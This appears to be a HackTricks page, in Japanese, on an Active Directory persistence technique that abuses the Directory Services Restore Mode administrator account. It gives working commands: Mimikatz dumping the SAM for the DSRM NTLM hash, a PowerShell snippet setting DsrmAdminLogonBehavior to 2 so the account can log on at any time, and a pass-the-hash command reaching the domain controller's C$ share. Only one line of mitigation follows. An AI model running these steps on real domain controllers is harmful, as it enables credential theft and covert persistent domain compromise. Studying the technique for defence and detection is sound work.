# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

すべてのドメインコントローラーには、Directory Services Restore Mode（DSRM）の管理者アカウントがあります。このパスワードはドメインコントローラーの昇格時に設定され、Active Directory ドメインアカウントとは別に管理されます。<sup>[[1]](#references)</sup>

ドメインコントローラーを管理者権限で制御できる攻撃者は、ローカル SAM データベースをダンプして、DSRM Administrator の NTLM hash を取得できます。次の Mimikatz コマンドでこの操作を実行できます。<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
デフォルトでは、DSRM アカウントは restore mode 用です。`DsrmAdminLogonBehavior` を `2` に設定すると、ドメイン コントローラーが通常稼働している間でも、このローカル アカウントによる認証が可能になります。変更する前に値を確認してください：<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
復元したハッシュは、pass-the-hash セッションで使用して、管理用の `C$` 共有などのリソースにアクセスできます。このローカルアカウントの場合は、ドメインコントローラーのコンピューター名を `/domain` の値として使用します:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Mitigation

- `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` への変更を監査します。キーの SACL が **Set Value** 操作を監査するように設定されている場合、Security event 4657 にレジストリ値の変更が記録されます。<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Directory Services Restore Mode administrator password をリセットする](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Sneaky Active Directory Persistence #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Sneaky Active Directory Persistence #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Event 4657 — レジストリ値が変更された](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
